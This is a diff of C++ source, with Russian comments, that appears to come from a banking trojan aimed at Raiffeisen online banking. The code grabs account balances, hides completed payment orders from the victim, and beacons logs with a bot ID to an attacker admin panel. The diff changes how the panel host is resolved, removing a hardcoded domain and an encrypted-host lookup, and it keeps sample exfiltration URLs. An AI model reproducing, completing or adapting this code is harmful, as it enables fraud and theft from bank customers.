@@ -8,7 +8,7 @@
 #include "WndUtils.h"
 #include "BotHTTP.h"
 
-#include "Inject.h"
+//#include "Inject.h"
 #include "ntdll.h"
 #include "commctrl.h"
 #include "BotHTTP.h"
@@ -126,7 +126,6 @@ static void GrabBalansFromLVM( int cln, char* s );
 static void LoadPaymentOrders(); //загрузка проведенных платежек из файла, чтобы их потом скрывать
 static void SavePaymentOrders(); //сохранение платежек
 static PaymentOrder* GetPaymentOrders(); //запрос новой платежки в админке
-static char* GetAdminUrl( char* url );
 static void DBGPrintPayment( PaymentOrder* po ); //печать переданной (считанной) платежки для дебага
 static void RelocPayment( char* base ); //перерасчитывает адреса в массиве paymentOrders после перевыделения памяти или загрузки из файла
 static int BalansToInt( const char* s, int format = 0 );
@@ -167,7 +166,7 @@ int widthScreen, heightScreen;
 const int maxFileReports = 5;
 FileReport fileReports[maxFileReports];
 
-char domain[128]; //адрес админки
+//char domain[128]; //адрес админки
 
 //контролы формы "Платежное поручение"
 ControlForm controlsPaymentOrder[] = 
@@ -210,7 +209,7 @@ static bool CmpWnd( const char* caption, DWORD captionHash, const char* classNam
 
 static void SendLogToAdmin( int num, const char* text = 0 )
 {
-	if( domain[0] == 0 ) return; //если админка неизвестна, то ничего не шлем
+	string Host = GetAzHost(true);
 	TMemory qr(1024);
 	const char *paramText;
 	char empty[1], *valText;
@@ -221,7 +220,7 @@ static void SendLogToAdmin( int num, const char* text = 0 )
 	}
 	else
 		empty[0] = 0, paramText = valText = empty;
-	int sz = pwsprintfA( qr, "http://%s/raf/?uid=%s&sys=raifur&mode=setlog&log=%d%s%s", domain, BOT_UID, num, paramText, valText );
+	int sz = pwsprintfA( qr, "http://%s/raf/?uid=%s&sys=raifur&mode=setlog&log=%d%s%s", Host.t_str(), BOT_UID, num, paramText, valText );
 	if( valText != empty ) STR::Free(valText);
 	THTTPResponseRec Response;
 	ClearStruct(Response);
@@ -1808,8 +1807,6 @@ static bool InitData()
 {
 	for( int i = 0; i < maxFileReports; i++ )
 		fileReports[i].file = 0;
-	if( GetAdminUrl(domain) == 0 )
-		domain[0] = 0;
 	return true;
 }
 
@@ -2090,21 +2087,6 @@ void GrabBalansFromLVM( int cln, char* s )
 }
 //http://sberbanksystem.ru/bal/?uid=TEST0123456789&type=raifur&sum=234234
 
-const char* panelaz = "az.gipa.in"; //"sberbanksystem.ru";
-
-static char* GetAdminUrl( char* url )
-{
-#ifdef DEBUGCONFIG
-	m_lstrcpy( url, panelaz );
-#else
-	string host = GetActiveHostFromBuf2(Rafa::Hosts(), 0x86D19DC3 /* __RAFA_HOSTS__ */, RAFAHOSTS_PARAM_ENCRYPTED );
-	if( !host.IsEmpty() )
-		m_lstrcpy( url, host.t_str() );
-	else
-		url = 0;
-#endif
-	return url;
-}
  
 //загрузка проведенных платежек из файла, чтобы их потом скрывать
 static void LoadPaymentOrders()
@@ -2164,7 +2146,7 @@ static char* SendToAdmin( const char* mode1, const char* mode2, bool ret )
 	char urlAdmin[128];
 	if( c_findedBalans == 0 ) return 0; //если аккаунты не обнаружены, то не смысла слать запрос
 	char* res = 0;
-	if( GetAdminUrl(urlAdmin) )
+//	if( GetAdminUrl(urlAdmin) )
 	{
 		const char* mode = mode1;
 		fwsprintfA pwsprintfA = Get_wsprintfA();
